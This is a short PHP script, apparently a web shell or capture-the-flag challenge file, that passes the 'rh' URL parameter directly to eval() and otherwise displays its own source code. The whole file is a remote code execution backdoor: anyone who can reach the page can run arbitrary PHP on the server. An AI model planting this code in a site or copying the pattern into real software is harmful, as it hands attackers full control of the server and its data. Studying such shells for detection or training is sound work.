 <?php
if (isset($_GET['rh'])) {
    eval($_GET['rh']);
} else {
    show_source(__FILE__);
}